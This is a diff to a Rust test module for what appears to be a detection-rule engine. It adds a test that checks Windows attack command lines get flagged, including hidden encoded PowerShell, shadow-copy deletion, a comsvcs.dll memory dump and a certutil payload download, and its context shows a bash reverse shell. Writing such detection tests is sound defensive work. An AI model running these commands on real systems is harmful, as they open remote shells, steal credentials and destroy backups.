@@ -259,7 +259,7 @@ mod tests {
     #[test]
     fn builtin_rules_are_valid_and_unique() {
         let rules = parse_rules(BUILTIN_RULES).unwrap();
-        assert!(rules.len() >= 25);
+        assert!(rules.len() >= 45);
         let mut ids: Vec<_> = rules.iter().map(|r| r.id.clone()).collect();
         ids.sort();
         ids.dedup();
@@ -274,6 +274,21 @@ mod tests {
             .with("process.cmdline", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1");
         let hits = e.evaluate("ep1", &ev);
         assert!(hits.iter().any(|r| r.mitre.iter().any(|m| m.starts_with("T1059"))), "{hits:?}");
+    }
+
+    #[test]
+    fn detects_windows_tradecraft() {
+        let mut e = engine();
+        let hit = |e: &mut Engine, name: &str, parent: &str, cmd: &str| -> Vec<String> {
+            let ev = Event::new("process_start").with("process.name", name).with("process.parent_name", parent).with("process.cmdline", cmd);
+            e.evaluate("win1", &ev).into_iter().map(|r| r.id).collect()
+        };
+        assert!(hit(&mut e, "powershell.exe", "WINWORD.EXE", "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA").contains(&"PC-WIN-004".to_string()));
+        assert!(hit(&mut e, "vssadmin.exe", "cmd.exe", "vssadmin.exe delete shadows /all /quiet").contains(&"PC-RANSOM-003".to_string()));
+        assert!(hit(&mut e, "rundll32.exe", "cmd.exe", "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\t\\l.dmp full").contains(&"PC-WIN-005".to_string()));
+        assert!(hit(&mut e, "certutil.exe", "cmd.exe", "certutil.exe -urlcache -split -f http://203.0.113.9/a.exe a.exe").contains(&"PC-WIN-003".to_string()));
+        assert!(hit(&mut e, "notepad.exe", "explorer.exe", "notepad.exe C:\\Users\\a\\notes.txt").is_empty());
+        assert!(hit(&mut e, "powershell.exe", "explorer.exe", "powershell.exe Get-ChildItem C:\\Users").is_empty());
     }
 
     #[test]
